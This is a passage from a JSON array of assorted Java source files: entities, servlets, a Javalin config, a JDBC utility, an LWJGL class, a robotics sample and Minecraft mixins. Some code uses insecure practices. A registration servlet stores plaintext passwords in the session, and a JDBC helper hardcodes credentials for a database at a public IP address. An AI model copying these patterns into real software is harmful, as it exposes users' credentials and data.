    this.rua = rua;\n    }\n\n    public String getNumero() {\n        return numero;\n    }\n\n    public void setNumero(String numero) {\n        this.numero = numero;\n    }\n\n    public String getComplemento() {\n        return complemento;\n    }\n\n    public void setComplemento(String complemento) {\n        this.complemento = complemento;\n    }\n\n    @java.lang.Override\n    public java.lang.String toString() {\n        return \"Endereco{\" +\n                \"cep='\" + cep + '\\'' +\n                \", estado='\" + estado + '\\'' +\n                \", cidade='\" + cidade + '\\'' +\n                \", rua='\" + rua + '\\'' +\n                \", numero='\" + numero + '\\'' +\n                \", complemento='\" + complemento + '\\'' +\n                '}';\n    }\n}",
    "/*\n * Copyright (c) 2002-2008 LWJGL Project\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *\n * * Redistributions of source code must retain the above copyright\n *   notice, this list of conditions and the following disclaimer.\n *\n * * Redistributions in binary form must reproduce the above copyright\n *   notice, this list of conditions and the following disclaimer in the\n *   documentation and/or other materials provided with the distribution.\n *\n * * Neither the name of 'LWJGL' nor the names of\n *   its contributors may be used to endorse or promote products derived\n *   from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n * TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n * PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\npackage org.lwjgl.opengl;\n\n/**\n * This class describes pixel format properties for an OpenGL context. Instances\n * of this class is used as arguments to Display.create(), Pbuffer.create() and\n * AWTGLCanvas, to indicate minimum required properties.\n * <p/>\n * Instants of this class are immutable. An example of the expected way to set\n * the PixelFormat property values is the following:\n * <code>PixelFormat pf = new PixelFormat().withDepthBits(24).withSamples(4).withSRGB(true);</code>\n * <p/>\n * WARNING: Some pixel formats are known to cause troubles on certain buggy drivers.\n * Example: Under Windows, specifying samples != 0 will enable the ARB\n * pixel format selection path, which could trigger a crash.\n *\n * @author elias_naur@sourceforge.net\n * @version $Revision$\n */\npublic final class PixelFormat implements PixelFormatLWJGL {\n\n\t/**\n\t * The number of bits per pixel, exluding alpha.\n\t * This parameter is ignored in Display.create().\n\t */\n\tprivate int bpp;\n\t/** The number of alpha bits. */\n\tprivate int alpha;\n\t/** The number of depth buffer bits */\n\tprivate int depth;\n\t/** The number of stencil bits */\n\tprivate int stencil;\n\t/**\n\t * The number of samples to use in anti-aliasing.\n\t * 0 means that anti-aliasing is disabled.\n\t */\n\tprivate int samples;\n\t/**\n\t * The number of COLOR_SAMPLES_NV to use for Coverage Sample Anti-aliasing (CSAA).\n\t * When this number is greater than 0, the {@code samples} property will be treated\n\t * as if it were the COVERAGE_SAMPLES_NV property.\n\t * <p/>\n\t * This property is currently a no-op for the MacOS implementation.\n\t */\n\tprivate int colorSamples;\n\t/** The number of auxiliary buffers */\n\tprivate int num_aux_buffers;\n\t/** The number of bits per pixel in the accumulation buffer */\n\tprivate int accum_bpp;\n\t/** The number of alpha bits in the accumulation buffer */\n\tprivate int accum_alpha;\n\t/** Whether this format requires a stereo buffer */\n\tprivate boolean stereo;\n\t/** Whether this format specifies a floating point format */\n\tprivate boolean floating_point;\n\t/**\n\t * Whether this format specifies a packed floating point format (32 bit unsigned - R11F_G11F_B10F)\n\t * This property is currently a no-op for the MacOS implementation.\n\t */\n\tprivate boolean floating_point_packed;\n\t/**\n\t * Whether this format specifies an sRGB format\n\t * This property is currently a no-op for the MacOS implementation.\n\t */\n\tprivate boolean sRGB;\n\n\t/**\n\t * Default pixel format is minimum 8 bits depth, and no alpha\n\t * nor stencil requirements.\n\t */\n\tpublic PixelFormat() {\n\t\tthis(0, 8, 0);\n\t}\n\n\tpublic PixelFormat(int alpha, int depth, int stencil) {\n\t\tthis(alpha, depth, stencil, 0);\n\t}\n\n\tpublic PixelFormat(int alpha, int depth, int stencil, int samples) {\n\t\tthis(0, alpha, depth, stencil, samples);\n\t}\n\n\tpublic PixelFormat(int bpp, int alpha, int depth, int stencil, int samples) {\n\t\tthis(bpp, alpha, depth, stencil, samples, 0, 0, 0, false);\n\t}\n\n\tpublic PixelFormat(int bpp, int alpha, int depth, int stencil, int samples, int num_aux_buffers, int accum_bpp, int accum_alpha, boolean stereo) {\n\t\tthis(bpp, alpha, depth, stencil, samples, num_aux_buffers, accum_bpp, accum_alpha, stereo, false);\n\t}\n\n\tpublic PixelFormat(int bpp, int alpha, int depth, int stencil, int samples, int num_aux_buffers, int accum_bpp, int accum_alpha, boolean stereo, boolean floating_point) {\n\t\tthis.bpp = bpp;\n\t\tthis.alpha = alpha;\n\t\tthis.depth = depth;\n\t\tthis.stencil = stencil;\n\n\t\tthis.samples = ",
    "package app.config;\n\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\n\nimport app.controllers.SecurityController;\nimport app.dtos.UserDTO;\nimport app.exceptions.ApiException;\nimport io.javalin.Javalin;\nimport io.javalin.apibuilder.EndpointGroup;\nimport io.javalin.http.HttpStatus;\nimport jakarta.persistence.EntityManagerFactory;\n\npublic class ApplicationConfig {\n    ObjectMapper om = new ObjectMapper();\n    private Javalin app;\n    private static ApplicationConfig instance;\n    private static SecurityController securityController;\n\n    private ApplicationConfig() {\n    };\n\n    public static ApplicationConfig getInstance(EntityManagerFactory emf) {\n        if (instance == null) {\n            securityController = new SecurityController(emf);\n            instance = new ApplicationConfig();\n        }\n        return instance;\n    }\n\n    public static ApplicationConfig getInstance() {\n        if (instance == null) {\n            throw new RuntimeException(\"EntityManagerFactory is not set\");\n        }\n        return instance;\n    }\n\n    public ApplicationConfig initiateServer() {\n        app = Javalin.create(config -> {\n            config.http.defaultContentType = \"application/json\";\n            config.routing.contextPath = \"/api\";\n        });\n        return instance;\n    }\n\n    public ApplicationConfig startServer(int port) {\n        app.start(port);\n        return instance;\n    }\n\n    public ApplicationConfig setRoute(EndpointGroup route) {\n        app.routes(route);\n        return instance;\n    }\n\n    public ApplicationConfig checkSecurityRoles() {\n        app.updateConfig(config -> {\n            config.accessManager((handler, ctx, permittedRoles) -> {\n                UserDTO user = ctx.attribute(\"user\");\n                Set<String> allowedRoles = permittedRoles.stream().map(role -> role.toString().toUpperCase())\n                        .collect(Collectors.toSet());\n                if (allowedRoles.contains(\"ANYONE\") || ctx.method().toString().equals(\"OPTIONS\")) {\n                    ctx.status(HttpStatus.OK);\n                    handler.handle(ctx);\n                    return;\n                } else {\n                    System.out.println(\"USER IN CHECK_SEC_ROLES: \" + user);\n                    if (user == null) {\n                        ctx.status(HttpStatus.FORBIDDEN)\n                                .json(om.createObjectNode()\n                                        .put(\"msg\", \"Not authorized. No username were added from the token\"));\n                        return;\n                    }\n                }\n\n                if (securityController.authorize(user, allowedRoles))\n                    handler.handle(ctx);\n                else\n                    throw new ApiException(HttpStatus.FORBIDDEN.getCode(), \"Unauthorized with roles: \" + allowedRoles);\n            });\n        });\n        return instance;\n    }\n\n    public ApplicationConfig setExceptionHandling() {\n        app.exception(Exception.class, (e, ctx) -> {\n            System.out.println(ctx.body());\n            e.printStackTrace();\n            ObjectNode node = om.createObjectNode().put(\"errorMessage\", e.getMessage());\n            ctx.status(500).json(node);\n        });\n        return instance;\n    }\n\n    // public ApplicationConfig errorHandling() {\n    // app.error(404, ctx -> {\n    // ctx.json(\"Custom 404\");\n    // });\n    // app.error(500, ctx -> {\n    // ctx.json(\"Custom 500\");\n    // });\n    // return instance;\n    // }\n\n    public void stopServer() {\n        app.stop();\n    }\n}",
    "package org.example;\n\n\n\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\nimport java.sql.SQLException;\n\n\n@WebServlet(urlPatterns = \"/userRegisterClass\")\npublic class UserRegister extends HttpServlet {\n    private static final Logger logger= LoggerFactory.getLogger(UserRegister.class);\n    public void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String userName=req.getParameter(\"userName\");\n        String userPassword=req.getParameter(\"userPassword\");\n\n\n\n        try {\n            if(userName != null && !userName.isEmpty()&& userPassword != null && !userPassword.isEmpty()) {\n                DAO.registerNewUser(userName, userPassword);\n                logger.info(\"User Registered\");\n                HttpSession session=req.getSession();\n                session.setAttribute(\"unmae\",userName);\n                session.setAttribute(\"pass\",userPassword);\n                res.sendRedirect(\"/userList\");\n            }else{\n\n                res.sendRedirect(\"registered.jsp\");\n            }\n\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n\n    }\n\n}\n",
    "package org.example;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.RequestDispatcher;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.logging.LogManager;\n\n\n@WebServlet(\"/showRes\")\npublic class show extends HttpServlet {\n    Logger log= LoggerFactory.getLogger(show.class);\n  //  java.util.logging.Logger li = (java.util.logging.Logger) LoggerFactory.getLogger(show.class);\n    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        ResultSet rs= null;\n        try {\n            HttpSession ses = req.getSession();\n            String uname = (String) ses.getAttribute(\"username\");\n            rs = JdbcConnection.fetchdata(uname);\n            log.info(\"JDBC conected\");\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n\n        req.setAttribute(\"result\",rs);\n        RequestDispatcher red = req.getRequestDispatcher(\"Show.jsp\");\n        red.forward(req,res);\n\n    }\n}\n",
    "/* Copyright (c) 2022 FIRST. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without modification,\n * are permitted (subject to the limitations in the disclaimer below) provided that\n * the following conditions are met:\n *\n * Redistributions of source code must retain the above copyright notice, this list\n * of conditions and the following disclaimer.\n *\n * Redistributions in binary form must reproduce the above copyright notice, this\n * list of conditions and the following disclaimer in the documentation and/or\n * other materials provided with the distribution.\n *\n * Neither the name of FIRST nor the names of its contributors may be used to endorse or\n * promote products derived from this software without specific prior written permission.\n *\n * NO EXPRESS OR IMPLIED LICENSES TO ANY PARTY'S PATENT RIGHTS ARE GRANTED BY THIS\n * LICENSE. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n * THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\npackage org.firstinspires.ftc.robotcontroller.external.samples;\n\nimport com.qualcomm.hardware.rev.RevHubOrientationOnRobot;\nimport com.qualcomm.robotcore.eventloop.opmode.Disabled;\nimport com.qualcomm.robotcore.eventloop.opmode.LinearOpMode;\nimport com.qualcomm.robotcore.eventloop.opmode.TeleOp;\nimport com.qualcomm.robotcore.hardware.IMU;\nimport org.firstinspires.ftc.robotcore.external.navigation.AngleUnit;\nimport org.firstinspires.ftc.robotcore.external.navigation.AngularVelocity;\nimport org.firstinspires.ftc.robotcore.external.navigation.Orientation;\nimport org.firstinspires.ftc.robotcore.external.navigation.YawPitchRollAngles;\n\nimport static com.qualcomm.hardware.rev.RevHubOrientationOnRobot.xyzOrientation;\n\n/*\n * This OpMode shows how to use the new universal IMU interface. This\n * interface may be used with the BNO055 IMU or the BHI260 IMU. It assumes that an IMU is configured\n * on the robot with the name \"imu\".\n *\n * The sample will display the current Yaw, Pitch and Roll of the robot.<br>\n * With the correct orientation parameters selected, pitch/roll/yaw should act as follows:\n *   Pitch value should INCREASE as the robot is tipped UP at the front. (Rotation about X)\n *   Roll value should INCREASE as the robot is tipped UP at the left side. (Rotation about Y)\n *   Yaw value should INCREASE as the robot is rotated Counter Clockwise. (Rotation about Z)\n *\n * The yaw can be reset (to zero) by pressing the Y button on the gamepad (Triangle on a PS4 controller)\n *\n * This specific sample DOES NOT assume that the Hub is mounted on one of the three orthogonal\n * planes (X/Y, X/Z or Y/Z) OR that the Hub has only been rotated in a range of 90 degree increments.\n *\n * Note: if your Hub is mounted Orthogonally (on a orthogonal surface, angled at some multiple of\n * 90 Degrees) then you should use the simpler SensorImuOrthogonal sample in this folder.\n *\n * But... If your Hub is mounted Non-Orthogonally, you must specify one or more rotational angles\n * that transform a \"Default\" Hub orientation into your desired orientation.  That is what is\n * illustrated here.\n *\n * Use Android Studio to Copy this Class, and Paste it into your team's code folder with a new name.\n * Remove or comment out the @Disabled line to add this OpMode to the Driver Station OpMode list.\n *\n * Finally, edit this OpMode to use at least one angle around an axis to orient your Hub.\n */\n@TeleOp(name = \"Sensor: IMU Non-Orthogonal\", group = \"Sensor\")\n@Disabled     // Comment this out to add to the OpMode list\npublic class SensorIMUNonOrthogonal extends LinearOpMode\n{\n    // The IMU sensor object\n    IMU imu;\n\n    //----------------------------------------------------------------------------------------------\n    // Main logic\n    //----------------------------------------------------------------------------------------------\n\n    @Override public void runOpMode() throws InterruptedException {\n\n        // Retrieve and initialize the IMU.\n        // This sample expects the IMU to be in a REV Hub and named \"imu\".\n        imu = hardwareMap.get(IMU.class, \"imu\");\n\n        /* Define how the hub is mounted to the robot to get the correct Yaw, Pitch and Roll values.\n         *\n         * You can apply up to three axis rotations to orient your Hub according to how it's mounted on the robot.\n         *\n       ",
    "package com.cydeo.jdbctests.utility;\n\nimport java.sql.*;\nimport java.util.ArrayList;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class DB_Util {\n\n    // declaring at class level so all methods can access\n    private static Connection con ;\n    private static Statement stm ;\n    private static ResultSet rs ;\n    private static ResultSetMetaData rsmd ;\n\n\n    /**\n     * Create Connection by jdbc url and username , password provided\n     * @param url  jdbc url for any database\n     * @param username username for database\n     * @param password password for database\n     */\n    public static void createConnection(String url , String username, String password){\n\n\n        try {\n            con = DriverManager.getConnection(url, username, password) ;\n            System.out.println(\"CONNECTION SUCCESSFUL\");\n        } catch (Exception e) {\n            System.out.println(\"CONNECTION HAS FAILED \" + e.getMessage() );\n        }\n\n    }\n\n\n\n    /**\n     * Create connection method , just checking one connection successful or not\n     */\n    public static void createConnection(){\n\n        String url      = \"jdbc:oracle:thin:@100.26.138.222:1521:XE\"; ;\n        String username = \"hr\" ;\n        String password = \"hr\" ;\n\n        createConnection(url, username, password);\n\n    }\n\n\n    /**\n     * Run the sql query provided and return ResultSet object\n     * @param sql the query to run\n     * @return ResultSet object  that contains data\n     */\n    public static ResultSet runQuery(String sql){\n\n        try {\n            stm = con.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);\n            rs = stm.executeQuery(sql); // setting the value of ResultSet object\n            rsmd = rs.getMetaData() ;  // setting the value of ResultSetMetaData for reuse\n        }catch(Exception e){\n            System.out.println(\"ERROR OCCURRED WHILE RUNNING QUERY \"+ e.getMessage() );\n        }\n\n        return rs ;\n\n    }\n\n    /**\n     * destroy method to clean up all the resources after being used\n     */\n    public static void destroy(){\n        // WE HAVE TO CHECK IF WE HAVE THE VALID OBJECT FIRST BEFORE CLOSING THE RESOURCE\n        // BECAUSE WE CAN NOT TAKE ACTION ON AN OBJECT THAT DOES NOT EXIST\n        try {\n            if( rs!=null)  rs.close();\n            if( stm!=null)  stm.close();\n            if( con!=null)  con.close();\n        } catch (Exception e) {\n            System.out.println(\"ERROR OCCURRED WHILE CLOSING RESOURCES \" + e.getMessage() );\n        }\n\n    }\n\n    /**\n     * This method will reset the cursor to before first location\n     */\n    private static void resetCursor(){\n\n        try {\n            rs.beforeFirst();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    }\n\n    // find out the row count\n\n    /**\n     * find out the row count\n     * @return row count of this ResultSet\n     */\n    public static int getRowCount(){\n\n        int rowCount = 0 ;\n        try {\n            rs.last() ;\n            rowCount = rs.getRow() ;\n        } catch (Exception e) {\n            System.out.println(\"ERROR OCCURRED WHILE GETTING ROW COUNT \" + e.getMessage() );\n        }finally {\n            resetCursor();\n        }\n\n        return rowCount ;\n\n    }\n\n\n    /**\n     * find out the column count\n     * @return column count of this ResultSet\n     */\n    public static int getColumnCount(){\n\n        int columnCount = 0 ;\n\n        try {\n            columnCount = rsmd.getColumnCount();\n\n        } catch (Exception e) {\n            System.out.println(\"ERROR OCCURRED WHILE GETTING COLUMN COUNT \" + e.getMessage() );\n        }\n\n        return columnCount ;\n\n    }\n\n\n\n    /**\n     * // Get all the Column names into a list object\n     * @return  List<String>\n     */\n    public static List<String> getAllColumnNamesAsList(){\n\n        List<String> columnNameLst = new ArrayList<>();\n\n        try {\n            for (int colIndex = 1; colIndex <= getColumnCount() ; colIndex++) {\n                String columnName =  rsmd.getColumnName(colIndex) ;\n                columnNameLst.add(columnName) ;\n            }\n        }catch (Exception e){\n            System.out.println(\"ERROR OCCURRED WHILE getAllColumnNamesAsList \"+ e.getMessage());\n        }\n\n        return columnNameLst ;\n\n    }\n\n    // get entire row of data according to row number\n\n    /**\n     * Getting entire row of data in a List of String\n     * @param rowNum row number to get as a list\n     * @return row data as List of String\n     */\n    public static List<String> getRowDataAsList( int rowNum ){\n\n        List<String> rowDataAsLst = new ArrayList<>();\n        int colCount =  getColumnCount() ;\n\n        try {\n            rs.absolute( rowNum );\n\n            for (int colIndex = 1; colIndex <= colCount ; colIndex++) {\n\n                String cellValue =  rs.getString( colIndex ) ;\n                rowDataAsLst.add(   cellValue  ) ;\n\n            }\n\n\n        } catch (Exception e) {\n            System.out.println(\"ERROR OCCUR",
    "package io.github.tropheusj.its_as_shrimple_as_that.mixin;\n\nimport com.mojang.math.Axis;\n\nimport io.github.tropheusj.its_as_shrimple_as_that.ItsAsShrimpleAsThat;\nimport io.github.tropheusj.its_as_shrimple_as_that.entity.render.ShrimpModel;\n\nimport io.github.tropheusj.its_as_shrimple_as_that.entity.render.ShrimpRenderer;\n\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.Unique;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfo;\n\nimport com.mojang.blaze3d.vertex.PoseStack;\nimport com.mojang.blaze3d.vertex.VertexConsumer;\n\nimport net.minecraft.client.player.AbstractClientPlayer;\nimport net.minecraft.client.renderer.MultiBufferSource;\nimport net.minecraft.client.renderer.RenderType;\nimport net.minecraft.client.renderer.entity.EntityRendererProvider.Context;\nimport net.minecraft.client.renderer.entity.player.PlayerRenderer;\nimport net.minecraft.client.renderer.texture.OverlayTexture;\nimport net.minecraft.world.entity.player.Player;\n\n@Mixin(PlayerRenderer.class)\npublic class PlayerRendererMixin {\n\t@Unique\n\tprivate ShrimpModel<Player> shrimpModel;\n\n\t@Inject(method = \"<init>\", at = @At(\"TAIL\"))\n\tprivate void onInit(Context context, boolean bl, CallbackInfo ci) {\n\t\tthis.shrimpModel = new ShrimpModel<>(context);\n\t}\n\n\t@Inject(\n\t\t\tmethod = \"render(Lnet/minecraft/client/player/AbstractClientPlayer;FFLcom/mojang/blaze3d/vertex/PoseStack;Lnet/minecraft/client/renderer/MultiBufferSource;I)V\",\n\t\t\tat = @At(\"HEAD\"),\n\t\t\tcancellable = true\n\t)\n\tprivate void renderShrimpInstead(AbstractClientPlayer player, float f, float g, PoseStack matrices, MultiBufferSource buffers, int i, CallbackInfo ci) {\n\t\tif (player.hasEffect(ItsAsShrimpleAsThat.KRILLED)) {\n\t\t\tmatrices.pushPose();\n\t\t\tmatrices.scale(-1, -1, 1);\n\t\t\tmatrices.translate(0, -1.5, 0);\n\t\t\tmatrices.mulPose(Axis.YP.rotationDegrees(player.getYRot() + 180));\n\t\t\tVertexConsumer buffer = buffers.getBuffer(RenderType.entityCutout(ShrimpRenderer.TEXTURE));\n\t\t\tthis.shrimpModel.renderToBuffer(matrices, buffer, i, OverlayTexture.NO_OVERLAY, 1, 1, 1, 1);\n\t\t\tmatrices.popPose();\n\t\t\tci.cancel();\n\t\t}\n\t}\n}\n",
    "package me.earth.mc_runtime_test.tweaker;\n\nimport io.github.impactdevelopment.simpletweaker.SimpleTweaker;\nimport net.minecraft.launchwrapper.LaunchClassLoader;\nimport org.spongepowered.asm.launch.MixinBootstrap;\nimport org.spongepowered.asm.mixin.MixinEnvironment;\nimport org.spongepowered.asm.mixin.Mixins;\nimport org.spongepowered.tools.obfuscation.mcp.ObfuscationServiceMCP;\n\nimport java.io.IOException;\n\n@SuppressWarnings(\"unused\")\npublic class McRuntimeTestTweaker extends SimpleTweaker {\n    @Override\n    public void injectIntoClassLoader(LaunchClassLoader classLoader) {\n        super.injectIntoClassLoader(classLoader);\n        MixinBootstrap.init();\n\n        String obfCtx = ObfuscationServiceMCP.NOTCH;\n        try {\n            if (classLoader.getClassBytes(\n                \"net.minecraftforge.common.ForgeHooks\") != null) {\n                obfCtx = ObfuscationServiceMCP.SEARGE;\n            }\n        } catch (IOException ignored) { }\n\n        MixinEnvironment.getDefaultEnvironment()\n                        .setSide(MixinEnvironment.Side.CLIENT);\n        MixinEnvironment.getDefaultEnvironment()\n                        .setObfuscationContext(obfCtx);\n\n        Mixins.addConfiguration(\"mc_runtime_test.mixins.json\");\n    }\n\n}\n",
    "package org.among.usermodule.user.security;\n\nimport org.among.usermodule.response.ErrorCode;\nimport org.among.usermodule.response.RestApiException;\nimport org.among.usermodule.user.UserEntity;\nimport org.among.usermodule.user.UserRepository;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.time.LocalDateTime;\n\nimport static java.util.Objects.*;\n\n@Service\npublic class CustomUserDetailService implements UserDetailsService {\n    private final UserRepository userRepository;\n\n    public CustomUserDetailService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        UserEntity user = userRepository.findByEmail(username);\n        if (isNull(user))\n            throw new RestApiException(ErrorCode.INVALID_EMAIL_VALUE);\n        return new User(user);\n    }\n\n    public boolean existUserByUsername(String username) {\n        UserEntity user = userRepository.findByEmail(username);\n        return nonNull(user);\n    }\n\n    /**\n     * \uc0ac\uc6a9\uc790 \uc788\ub294 \uacbd\uc6b0, \ucd5c\uc885 \ub85c\uadf8\uc778 \uc2dc\uac01 \uc5c5\ub370\uc774\ud2b8\n     * @param username {String}\n     * @param dateTime {LocalDateTime}\n     */\n    @Transactional\n    public void updateLastLoginDateTime(String username, LocalDateTime dateTime) {\n        UserEntity user = userRepository.findByEmail(username);\n        user.setLastLoginDateTime(dateTime);\n    }\n}\n",
    "/*\n * Copyright (C) 2024-2026 Jidcoo(https://github.com/jidcoo).\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage io.github.jidcoo.opto.lcdb.enhancer.core.parser;\n\nimport io.github.jidcoo.opto.lcdb.enhancer.base.Order;\n\n/**\n * <p>InputParserNode is an input parse node.</p>\n * <p>An InputParserNode will focus on a part of\n * the entire input parsing process organized by\n * the {@link InputParserChain}.\n * </p>\n *\n * <p>Note: InputParserNode implements the {@link Order}\n * and it' s also an abstract class. So please do not\n * forget to implement the {@link #getOrder()} method.\n * Because it will directly reflect the priority of\n * this input-parser-node!!!\n * </p>\n *\n * @author Jidcoo\n * @since 1.0\n */\nabstract class InputParserNode implements Order {\n\n    /**\n     * Parse input with context.\n     *\n     * @param context the instance parser context.\n     * @return the parsed result object.\n     * @apiNote You can call the {@link InputParserContext#peekInput()} method\n     *          of the context to view the output of the previous node.\n     *          But the prerequisite is that the\n     *          {@link InputParserContext#getInputStackSize()} method of\n     *          the context returns an int greater than 0.\n     */\n    abstract Object parse(InputParserContext context);\n}\n",
    "package shop.mtcoding.projectjobplan.board;\n\nimport jakarta.persistence.*;\nimport lombok.Builder;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport org.hibernate.annotations.CreationTimestamp;\nimport shop.mtcoding.projectjobplan._core.utils.ConvertUtil;\nimport shop.mtcoding.projectjobplan.apply.Apply;\nimport shop.mtcoding.projectjobplan.skill.Skill;\nimport shop.mtcoding.projectjobplan.subscribe.Subscribe;\nimport shop.mtcoding.projectjobplan.user.User;\n\nimport java.sql.Timestamp;\nimport java.util.ArrayList;\nimport java.util.List;\n\n@NoArgsConstructor\n@Entity\n@Data\n@Table(name = \"board_tb\")\npublic class Board {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Integer id;\n\n    @ManyToOne(fetch = FetchType.LAZY)\n    private User user;\n\n    // @Column(nullable = false)\n    private String title; // \uc81c\ubaa9\n    private String content; // \ub0b4\uc6a9\n    private String field; // \ucc44\uc6a9 \ubd84\uc57c\n    private String position; // \ud3ec\uc9c0\uc158\n    private String salary; // \uc5f0\ubd09\n\n    @OneToMany(mappedBy = \"board\", cascade = CascadeType.REMOVE)\n    private List<Skill> skillList;\n\n    // \ub0a0\uc9dc\n    private Timestamp openingDate; // \uac8c\uc2dc\uc77c\n    private Timestamp closingDate; // \ub9c8\uac10\uc77c == null -> \"\uc0c1\uc2dc\ucc44\uc6a9\"\n\n    @CreationTimestamp\n    private Timestamp createdAt; // \uc0dd\uc131\uc77c\n\n    @OneToMany(mappedBy = \"board\", fetch = FetchType.LAZY, cascade = CascadeType.REMOVE) // Entity \uac1d\uccb4\uc758 \ubcc0\uc218\uba85 == FK\uc758 \uc8fc\uc778\n    private List<Apply> applies = new ArrayList<>();\n\n    @OneToMany(mappedBy = \"board\", fetch = FetchType.LAZY, cascade = CascadeType.REMOVE) // Entity \uac1d\uccb4\uc758 \ubcc0\uc218\uba85 == FK\uc758 \uc8fc\uc778\n    private List<Subscribe> subscribes = new ArrayList<>();\n\n    public void update(BoardRequest.UpdateDTO requestDTO) {\n        this.title = requestDTO.getTitle();\n        this.content = requestDTO.getContent();\n        this.field = requestDTO.getField();\n        this.position = requestDTO.getPosition();\n        this.salary = requestDTO.getSalary();\n        this.openingDate = ConvertUtil.timestampConverter(requestDTO.getOpeningDate());\n        this.closingDate = ConvertUtil.timestampConverter(requestDTO.getClosingDate());\n    }\n\n    @Builder\n    public Board(Integer id, User user, String title, String content, String field, String position, String salary, String openingDate, String closingDate, Timestamp createdAt) {\n        this.id = id;\n        this.user = user;\n        this.title = title;\n        this.content = content;\n        this.field = field;\n        this.position = position;\n        this.salary = salary;\n        this.openingDate = ConvertUtil.timestampConverter(openingDate);\n        this.closingDate = ConvertUtil.timestampConverter(closingDate);\n        this.createdAt = createdAt;\n    }\n}\n",
